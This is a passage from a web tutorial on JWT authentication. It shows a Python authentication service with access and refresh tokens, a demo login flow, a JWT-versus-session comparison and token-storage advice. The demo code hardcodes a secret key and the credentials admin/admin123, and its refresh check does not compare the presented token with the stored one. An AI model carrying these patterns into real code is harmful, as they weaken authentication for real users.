<a id="__codelineno-18-300" name="__codelineno-18-300" href="#__codelineno-18-300"></a>            <span class="n">email</span> <span class="o">=</span> <span class="s2">&quot;user@example.com&quot;</span>
<a id="__codelineno-18-301" name="__codelineno-18-301" href="#__codelineno-18-301"></a>            <span class="n">role</span> <span class="o">=</span> <span class="s2">&quot;user&quot;</span>
<a id="__codelineno-18-302" name="__codelineno-18-302" href="#__codelineno-18-302"></a>        <span class="k">else</span><span class="p">:</span>
<a id="__codelineno-18-303" name="__codelineno-18-303" href="#__codelineno-18-303"></a>            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;success&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid credentials&quot;</span><span class="p">}</span>
<a id="__codelineno-18-304" name="__codelineno-18-304" href="#__codelineno-18-304"></a>
<a id="__codelineno-18-305" name="__codelineno-18-305" href="#__codelineno-18-305"></a>        <span class="c1"># Create access token (short-lived)</span>
<a id="__codelineno-18-306" name="__codelineno-18-306" href="#__codelineno-18-306"></a>        <span class="n">access_token</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">jwt_service</span><span class="o">.</span><span class="n">create_token</span><span class="p">(</span>
<a id="__codelineno-18-307" name="__codelineno-18-307" href="#__codelineno-18-307"></a>            <span class="n">user_id</span><span class="o">=</span><span class="n">user_id</span><span class="p">,</span>
<a id="__codelineno-18-308" name="__codelineno-18-308" href="#__codelineno-18-308"></a>            <span class="n">email</span><span class="o">=</span><span class="n">email</span><span class="p">,</span>
<a id="__codelineno-18-309" name="__codelineno-18-309" href="#__codelineno-18-309"></a>            <span class="n">role</span><span class="o">=</span><span class="n">role</span><span class="p">,</span>
<a id="__codelineno-18-310" name="__codelineno-18-310" href="#__codelineno-18-310"></a>            <span class="n">expires_in</span><span class="o">=</span><span class="mi">900</span>  <span class="c1"># 15 minutes</span>
<a id="__codelineno-18-311" name="__codelineno-18-311" href="#__codelineno-18-311"></a>        <span class="p">)</span>
<a id="__codelineno-18-312" name="__codelineno-18-312" href="#__codelineno-18-312"></a>
<a id="__codelineno-18-313" name="__codelineno-18-313" href="#__codelineno-18-313"></a>        <span class="c1"># Create refresh token (long-lived)</span>
<a id="__codelineno-18-314" name="__codelineno-18-314" href="#__codelineno-18-314"></a>        <span class="n">refresh_token</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">jwt_service</span><span class="o">.</span><span class="n">create_token</span><span class="p">(</span>
<a id="__codelineno-18-315" name="__codelineno-18-315" href="#__codelineno-18-315"></a>            <span class="n">user_id</span><span class="o">=</span><span class="n">user_id</span><span class="p">,</span>
<a id="__codelineno-18-316" name="__codelineno-18-316" href="#__codelineno-18-316"></a>            <span class="n">email</span><span class="o">=</span><span class="n">email</span><span class="p">,</span>
<a id="__codelineno-18-317" name="__codelineno-18-317" href="#__codelineno-18-317"></a>            <span class="n">role</span><span class="o">=</span><span class="n">role</span><span class="p">,</span>
<a id="__codelineno-18-318" name="__codelineno-18-318" href="#__codelineno-18-318"></a>            <span class="n">expires_in</span><span class="o">=</span><span class="mi">604800</span>  <span class="c1"># 7 days</span>
<a id="__codelineno-18-319" name="__codelineno-18-319" href="#__codelineno-18-319"></a>        <span class="p">)</span>
<a id="__codelineno-18-320" name="__codelineno-18-320" href="#__codelineno-18-320"></a>
<a id="__codelineno-18-321" name="__codelineno-18-321" href="#__codelineno-18-321"></a>        <span class="c1"># Store refresh token</span>
<a id="__codelineno-18-322" name="__codelineno-18-322" href="#__codelineno-18-322"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">refresh_tokens</span><span class="p">[</span><span class="n">user_id</span><span class="p">]</span> <span class="o">=</span> <span class="n">refresh_token</span>
<a id="__codelineno-18-323" name="__codelineno-18-323" href="#__codelineno-18-323"></a>
<a id="__codelineno-18-324" name="__codelineno-18-324" href="#__codelineno-18-324"></a>        <span class="k">return</span> <span class="p">{</span>
<a id="__codelineno-18-325" name="__codelineno-18-325" href="#__codelineno-18-325"></a>            <span class="s2">&quot;success&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
<a id="__codelineno-18-326" name="__codelineno-18-326" href="#__codelineno-18-326"></a>            <span class="s2">&quot;access_token&quot;</span><span class="p">:</span> <span class="n">access_token</span><span class="p">,</span>
<a id="__codelineno-18-327" name="__codelineno-18-327" href="#__codelineno-18-327"></a>            <span class="s2">&quot;refresh_token&quot;</span><span class="p">:</span> <span class="n">refresh_token</span><span class="p">,</span>
<a id="__codelineno-18-328" name="__codelineno-18-328" href="#__codelineno-18-328"></a>            <span class="s2">&quot;token_type&quot;</span><span class="p">:</span> <span class="s2">&quot;Bearer&quot;</span><span class="p">,</span>
<a id="__codelineno-18-329" name="__codelineno-18-329" href="#__codelineno-18-329"></a>            <span class="s2">&quot;expires_in&quot;</span><span class="p">:</span> <span class="mi">900</span>
<a id="__codelineno-18-330" name="__codelineno-18-330" href="#__codelineno-18-330"></a>        <span class="p">}</span>
<a id="__codelineno-18-331" name="__codelineno-18-331" href="#__codelineno-18-331"></a>
<a id="__codelineno-18-332" name="__codelineno-18-332" href="#__codelineno-18-332"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">refresh_access_token</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">refresh_token</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<a id="__codelineno-18-333" name="__codelineno-18-333" href="#__codelineno-18-333"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Generate new access token from refresh token&quot;&quot;&quot;</span>
<a id="__codelineno-18-334" name="__codelineno-18-334" href="#__codelineno-18-334"></a>        <span class="c1"># Verify refresh token</span>
<a id="__codelineno-18-335" name="__codelineno-18-335" href="#__codelineno-18-335"></a>        <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">jwt_service</span><span class="o">.</span><span class="n">verify_token</span><span class="p">(</span><span class="n">refresh_token</span><span class="p">)</span>
<a id="__codelineno-18-336" name="__codelineno-18-336" href="#__codelineno-18-336"></a>
<a id="__codelineno-18-337" name="__codelineno-18-337" href="#__codelineno-18-337"></a>        <span class="k">if</span> <span class="ow">not</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;valid&#39;</span><span class="p">]:</span>
<a id="__codelineno-18-338" name="__codelineno-18-338" href="#__codelineno-18-338"></a>            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;success&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid refresh token&quot;</span><span class="p">}</span>
<a id="__codelineno-18-339" name="__codelineno-18-339" href="#__codelineno-18-339"></a>
<a id="__codelineno-18-340" name="__codelineno-18-340" href="#__codelineno-18-340"></a>        <span class="n">user_id</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">][</span><span class="s1">&#39;sub&#39;</span><span class="p">]</span>
<a id="__codelineno-18-341" name="__codelineno-18-341" href="#__codelineno-18-341"></a>
<a id="__codelineno-18-342" name="__codelineno-18-342" href="#__codelineno-18-342"></a>        <span class="c1"># Check if refresh token is in our store</span>
<a id="__codelineno-18-343" name="__codelineno-18-343" href="#__codelineno-18-343"></a>        <span class="k">if</span> <span class="n">user_id</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">refresh_tokens</span><span class="p">:</span>
<a id="__codelineno-18-344" name="__codelineno-18-344" href="#__codelineno-18-344"></a>            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;success&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Refresh token not found&quot;</span><span class="p">}</span>
<a id="__codelineno-18-345" name="__codelineno-18-345" href="#__codelineno-18-345"></a>
<a id="__codelineno-18-346" name="__codelineno-18-346" href="#__codelineno-18-346"></a>        <span class="c1"># Create new access token</span>
<a id="__codelineno-18-347" name="__codelineno-18-347" href="#__codelineno-18-347"></a>        <span class="n">new_access_token</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">jwt_service</span><span class="o">.</span><span class="n">create_token</span><span class="p">(</span>
<a id="__codelineno-18-348" name="__codelineno-18-348" href="#__codelineno-18-348"></a>            <span class="n">user_id</span><span class="o">=</span><span class="n">user_id</span><span class="p">,</span>
<a id="__codelineno-18-349" name="__codelineno-18-349" href="#__codelineno-18-349"></a>            <span class="n">email</span><span class="o">=</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">][</span><span class="s1">&#39;email&#39;</span><span class="p">],</span>
<a id="__codelineno-18-350" name="__codelineno-18-350" href="#__codelineno-18-350"></a>            <span class="n">role</span><span class="o">=</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">][</span><span class="s1">&#39;role&#39;</span><span class="p">],</span>
<a id="__codelineno-18-351" name="__codelineno-18-351" href="#__codelineno-18-351"></a>            <span class="n">expires_in</span><span class="o">=</span><span class="mi">900</span>
<a id="__codelineno-18-352" name="__codelineno-18-352" href="#__codelineno-18-352"></a>        <span class="p">)</span>
<a id="__codelineno-18-353" name="__codelineno-18-353" href="#__codelineno-18-353"></a>
<a id="__codelineno-18-354" name="__codelineno-18-354" href="#__codelineno-18-354"></a>        <span class="k">return</span> <span class="p">{</span>
<a id="__codelineno-18-355" name="__codelineno-18-355" href="#__codelineno-18-355"></a>            <span class="s2">&quot;success&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
<a id="__codelineno-18-356" name="__codelineno-18-356" href="#__codelineno-18-356"></a>            <span class="s2">&quot;access_token&quot;</span><span class="p">:</span> <span class="n">new_access_token</span><span class="p">,</span>
<a id="__codelineno-18-357" name="__codelineno-18-357" href="#__codelineno-18-357"></a>            <span class="s2">&quot;token_type&quot;</span><span class="p">:</span> <span class="s2">&quot;Bearer&quot;</span><span class="p">,</span>
<a id="__codelineno-18-358" name="__codelineno-18-358" href="#__codelineno-18-358"></a>            <span class="s2">&quot;expires_in&quot;</span><span class="p">:</span> <span class="mi">900</span>
<a id="__codelineno-18-359" name="__codelineno-18-359" href="#__codelineno-18-359"></a>        <span class="p">}</span>
<a id="__codelineno-18-360" name="__codelineno-18-360" href="#__codelineno-18-360"></a>
<a id="__codelineno-18-361" name="__codelineno-18-361" href="#__codelineno-18-361"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">logout</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user_id</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<a id="__codelineno-18-362" name="__codelineno-18-362" href="#__codelineno-18-362"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Logout user by removing refresh token&quot;&quot;&quot;</span>
<a id="__codelineno-18-363" name="__codelineno-18-363" href="#__codelineno-18-363"></a>        <span class="k">if</span> <span class="n">user_id</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">refresh_tokens</span><span class="p">:</span>
<a id="__codelineno-18-364" name="__codelineno-18-364" href="#__codelineno-18-364"></a>            <span class="k">del</span> <span class="bp">self</span><span class="o">.</span><span class="n">refresh_tokens</span><span class="p">[</span><span class="n">user_id</span><span class="p">]</span>
<a id="__codelineno-18-365" name="__codelineno-18-365" href="#__codelineno-18-365"></a>        <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;success&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">}</span>
<a id="__codelineno-18-366" name="__codelineno-18-366" href="#__codelineno-18-366"></a>
<a id="__codelineno-18-367" name="__codelineno-18-367" href="#__codelineno-18-367"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">validate_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">authorization_header</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<a id="__codelineno-18-368" name="__codelineno-18-368" href="#__codelineno-18-368"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Validate API request with Bearer token&quot;&quot;&quot;</span>
<a id="__codelineno-18-369" name="__codelineno-18-369" href="#__codelineno-18-369"></a>        <span class="k">if</span> <span class="ow">not</span> <span class="n">authorization_header</span><span class="p">:</span>
<a id="__codelineno-18-370" name="__codelineno-18-370" href="#__codelineno-18-370"></a>            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;valid&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;No authorization header&quot;</span><span class="p">}</span>
<a id="__codelineno-18-371" name="__codelineno-18-371" href="#__codelineno-18-371"></a>
<a id="__codelineno-18-372" name="__codelineno-18-372" href="#__codelineno-18-372"></a>        <span class="c1"># Extract token from &quot;Bearer &lt;token&gt;&quot;</span>
<a id="__codelineno-18-373" name="__codelineno-18-373" href="#__codelineno-18-373"></a>        <span class="n">parts</span> <span class="o">=</span> <span class="n">authorization_header</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
<a id="__codelineno-18-374" name="__codelineno-18-374" href="#__codelineno-18-374"></a>        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span> <span class="ow">or</span> <span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;Bearer&quot;</span><span class="p">:</span>
<a id="__codelineno-18-375" name="__codelineno-18-375" href="#__codelineno-18-375"></a>            <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;valid&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid authorization header&quot;</span><span class="p">}</span>
<a id="__codelineno-18-376" name="__codelineno-18-376" href="#__codelineno-18-376"></a>
<a id="__codelineno-18-377" name="__codelineno-18-377" href="#__codelineno-18-377"></a>        <span class="n">token</span> <span class="o">=</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-18-378" name="__codelineno-18-378" href="#__codelineno-18-378"></a>
<a id="__codelineno-18-379" name="__codelineno-18-379" href="#__codelineno-18-379"></a>        <span class="c1"># Verify token</span>
<a id="__codelineno-18-380" name="__codelineno-18-380" href="#__codelineno-18-380"></a>        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">jwt_service</span><span class="o">.</span><span class="n">verify_token</span><span class="p">(</span>
<a id="__codelineno-18-381" name="__codelineno-18-381" href="#__codelineno-18-381"></a>            <span class="n">token</span><span class="p">,</span>
<a id="__codelineno-18-382" name="__codelineno-18-382" href="#__codelineno-18-382"></a>            <span class="n">expected_audience</span><span class="o">=</span><span class="s2">&quot;https://api.myapp.com&quot;</span>
<a id="__codelineno-18-383" name="__codelineno-18-383" href="#__codelineno-18-383"></a>        <span class="p">)</span>
<a id="__codelineno-18-384" name="__codelineno-18-384" href="#__codelineno-18-384"></a>
<a id="__codelineno-18-385" name="__codelineno-18-385" href="#__codelineno-18-385"></a>
<a id="__codelineno-18-386" name="__codelineno-18-386" href="#__codelineno-18-386"></a><span class="c1"># Example Usage: Complete Auth Flow</span>
<a id="__codelineno-18-387" name="__codelineno-18-387" href="#__codelineno-18-387"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
<a id="__codelineno-18-388" name="__codelineno-18-388" href="#__codelineno-18-388"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Complete Authentication Flow&quot;</span><span class="p">)</span>
<a id="__codelineno-18-389" name="__codelineno-18-389" href="#__codelineno-18-389"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
<a id="__codelineno-18-390" name="__codelineno-18-390" href="#__codelineno-18-390"></a>
<a id="__codelineno-18-391" name="__codelineno-18-391" href="#__codelineno-18-391"></a><span class="n">auth_service</span> <span class="o">=</span> <span class="n">AuthenticationService</span><span class="p">(</span><span class="n">secret_key</span><span class="o">=</span><span class="s2">&quot;my-app-secret-key-2024&quot;</span><span class="p">)</span>
<a id="__codelineno-18-392" name="__codelineno-18-392" href="#__codelineno-18-392"></a>
<a id="__codelineno-18-393" name="__codelineno-18-393" href="#__codelineno-18-393"></a><span class="c1"># Step 1: Login</span>
<a id="__codelineno-18-394" name="__codelineno-18-394" href="#__codelineno-18-394"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">1 User Login&quot;</span><span class="p">)</span>
<a id="__codelineno-18-395" name="__codelineno-18-395" href="#__codelineno-18-395"></a><span class="n">login_result</span> <span class="o">=</span> <span class="n">auth_service</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="s2">&quot;admin123&quot;</span><span class="p">)</span>
<a id="__codelineno-18-396" name="__codelineno-18-396" href="#__codelineno-18-396"></a><span class="k">if</span> <span class="n">login_result</span><span class="p">[</span><span class="s1">&#39;success&#39;</span><span class="p">]:</span>
<a id="__codelineno-18-397" name="__codelineno-18-397" href="#__codelineno-18-397"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot; Login successful&quot;</span><span class="p">)</span>
<a id="__codelineno-18-398" name="__codelineno-18-398" href="#__codelineno-18-398"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Access Token: </span><span class="si">{</span><span class="n">login_result</span><span class="p">[</span><span class="s1">&#39;access_token&#39;</span><span class="p">][:</span><span class="mi">50</span><span class="p">]</span><span class="si">}</span><span class="s2">...&quot;</span><span class="p">)</span>
<a id="__codelineno-18-399" name="__codelineno-18-399" href="#__codelineno-18-399"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Refresh Token: </span><span class="si">{</span><span class="n">login_result</span><span class="p">[</span><span class="s1">&#39;refresh_token&#39;</span><span class="p">][:</span><span class="mi">50</span><span class="p">]</span><span class="si">}</span><span class="s2">...&quot;</span><span class="p">)</span>
<a id="__codelineno-18-400" name="__codelineno-18-400" href="#__codelineno-18-400"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Expires in: </span><span class="si">{</span><span class="n">login_result</span><span class="p">[</span><span class="s1">&#39;expires_in&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> seconds&quot;</span><span class="p">)</span>
<a id="__codelineno-18-401" name="__codelineno-18-401" href="#__codelineno-18-401"></a>
<a id="__codelineno-18-402" name="__codelineno-18-402" href="#__codelineno-18-402"></a>    <span class="n">access_token</span> <span class="o">=</span> <span class="n">login_result</span><span class="p">[</span><span class="s1">&#39;access_token&#39;</span><span class="p">]</span>
<a id="__codelineno-18-403" name="__codelineno-18-403" href="#__codelineno-18-403"></a>    <span class="n">refresh_token</span> <span class="o">=</span> <span class="n">login_result</span><span class="p">[</span><span class="s1">&#39;refresh_token&#39;</span><span class="p">]</span>
<a id="__codelineno-18-404" name="__codelineno-18-404" href="#__codelineno-18-404"></a>
<a id="__codelineno-18-405" name="__codelineno-18-405" href="#__codelineno-18-405"></a><span class="c1"># Step 2: Make API request</span>
<a id="__codelineno-18-406" name="__codelineno-18-406" href="#__codelineno-18-406"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">2 Make API Request&quot;</span><span class="p">)</span>
<a id="__codelineno-18-407" name="__codelineno-18-407" href="#__codelineno-18-407"></a><span class="n">auth_header</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;Bearer </span><span class="si">{</span><span class="n">access_token</span><span class="si">}</span><span class="s2">&quot;</span>
<a id="__codelineno-18-408" name="__codelineno-18-408" href="#__codelineno-18-408"></a><span class="n">validation_result</span> <span class="o">=</span> <span class="n">auth_service</span><span class="o">.</span><span class="n">validate_request</span><span class="p">(</span><span class="n">auth_header</span><span class="p">)</span>
<a id="__codelineno-18-409" name="__codelineno-18-409" href="#__codelineno-18-409"></a><span class="k">if</span> <span class="n">validation_result</span><span class="p">[</span><span class="s1">&#39;valid&#39;</span><span class="p">]:</span>
<a id="__codelineno-18-410" name="__codelineno-18-410" href="#__codelineno-18-410"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot; Request authorized&quot;</span><span class="p">)</span>
<a id="__codelineno-18-411" name="__codelineno-18-411" href="#__codelineno-18-411"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;User: </span><span class="si">{</span><span class="n">validation_result</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">][</span><span class="s1">&#39;email&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-18-412" name="__codelineno-18-412" href="#__codelineno-18-412"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Role: </span><span class="si">{</span><span class="n">validation_result</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">][</span><span class="s1">&#39;role&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-18-413" name="__codelineno-18-413" href="#__codelineno-18-413"></a>
<a id="__codelineno-18-414" name="__codelineno-18-414" href="#__codelineno-18-414"></a><span class="c1"># Step 3: Refresh access token</span>
<a id="__codelineno-18-415" name="__codelineno-18-415" href="#__codelineno-18-415"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">3 Refresh Access Token&quot;</span><span class="p">)</span>
<a id="__codelineno-18-416" name="__codelineno-18-416" href="#__codelineno-18-416"></a><span class="n">refresh_result</span> <span class="o">=</span> <span class="n">auth_service</span><span class="o">.</span><span class="n">refresh_access_token</span><span class="p">(</span><span class="n">refresh_token</span><span class="p">)</span>
<a id="__codelineno-18-417" name="__codelineno-18-417" href="#__codelineno-18-417"></a><span class="k">if</span> <span class="n">refresh_result</span><span class="p">[</span><span class="s1">&#39;success&#39;</span><span class="p">]:</span>
<a id="__codelineno-18-418" name="__codelineno-18-418" href="#__codelineno-18-418"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot; New access token generated&quot;</span><span class="p">)</span>
<a id="__codelineno-18-419" name="__codelineno-18-419" href="#__codelineno-18-419"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;New Token: </span><span class="si">{</span><span class="n">refresh_result</span><span class="p">[</span><span class="s1">&#39;access_token&#39;</span><span class="p">][:</span><span class="mi">50</span><span class="p">]</span><span class="si">}</span><span class="s2">...&quot;</span><span class="p">)</span>
<a id="__codelineno-18-420" name="__codelineno-18-420" href="#__codelineno-18-420"></a>
<a id="__codelineno-18-421" name="__codelineno-18-421" href="#__codelineno-18-421"></a><span class="c1"># Step 4: Logout</span>
<a id="__codelineno-18-422" name="__codelineno-18-422" href="#__codelineno-18-422"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">4 Logout&quot;</span><span class="p">)</span>
<a id="__codelineno-18-423" name="__codelineno-18-423" href="#__codelineno-18-423"></a><span class="n">logout_result</span> <span class="o">=</span> <span class="n">auth_service</span><span class="o">.</span><span class="n">logout</span><span class="p">(</span><span class="s2">&quot;user_001&quot;</span><span class="p">)</span>
<a id="__codelineno-18-424" name="__codelineno-18-424" href="#__codelineno-18-424"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot; Logout successful: </span><span class="si">{</span><span class="n">logout_result</span><span class="p">[</span><span class="s1">&#39;success&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre></div>
<hr />
<h2 id="jwt-vs-session-comparison">JWT vs Session Comparison</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>
<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>                    JWT vs Session-Based Auth                   
<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>                                SESSION-BASED                   
<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>
<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a> Storage           Server stores session in DB/Redis           
<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a> Scalability        Requires sticky sessions or shared store 
<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a> Database Lookup    Required for every request               
<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a> Stateful           Yes (server maintains state)             
<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a> Revocation         Easy (delete session from DB)            
<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a> Size              Small (session ID only)                     
<a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a> Security          Good (server-controlled)                    
<a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>
<a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a>                                   JWT-BASED                    
<a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>
<a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a> Storage           Client stores token (localStorage/cookie)   
<a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a> Scalability        No server-side storage needed            
<a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a> Database Lookup    Not required (self-contained)            
<a id="__codelineno-19-19" name="__codelineno-19-19" href="#__codelineno-19-19"></a> Stateless          Yes (server is stateless)                
<a id="__codelineno-19-20" name="__codelineno-19-20" href="#__codelineno-19-20"></a> Revocation         Difficult (need blacklist or short TTL)  
<a id="__codelineno-19-21" name="__codelineno-19-21" href="#__codelineno-19-21"></a> Size              Large (entire payload encoded)              
<a id="__codelineno-19-22" name="__codelineno-19-22" href="#__codelineno-19-22"></a> Security          Good (with proper implementation)           
<a id="__codelineno-19-23" name="__codelineno-19-23" href="#__codelineno-19-23"></a>
</code></pre></div>
<h3 id="when-to-use-jwt-vs-sessions">When to Use JWT vs Sessions</h3>
<p><strong>Use JWT When:</strong>
- Building microservices architecture
- Need horizontal scalability
- API is consumed by multiple clients (web, mobile, IoT)
- Cross-domain authentication (CORS)
- Single Sign-On (SSO)</p>
<p><strong>Use Sessions When:</strong>
- Monolithic application
- Need instant revocation
- Sensitive admin panel
- Small application with single server
- Compliance requires server-side control</p>
<hr />
<h2 id="jwt-security-best-practices">JWT Security Best Practices</h2>
<h3 id="1-token-storage">1. <strong>Token Storage</strong></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1">//  BAD: localStorage (vulnerable to XSS)</span>
<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">jwt</span><span class="p">);</span>
<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="c1">//  GOOD: HttpOnly cookie (protected from XSS)</span>
<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="c1">// Server sets cookie:</span>
<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="nx">response</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">jwt</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="w">  </span><span class="nx">httpOnly</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">    </span><span class="c1">// Not accessible via JavaScript</span>
<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="w">  </span><span class="nx">secure</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">      </span><span class="c1">// Only sent over HTTPS</span>
<a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="w">  </span><span class="nx">sameSite</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;strict&#39;</span><span class="p">,</span><span class="w"> </span><span class="c1">// CSRF protection</span>
<a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="w">  </span><span class="nx">maxAge</span><span class="o">:</span><span class="w"> </span><span class="mf">3600000</span><span class="w">    </span><span class="c1">// 1 hour</span>
<a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a><span class="p">});</span>
</code></pre></div>
<h3 id="2-secret-key-security">2. <strong>Secret Key Security</strong></h3>
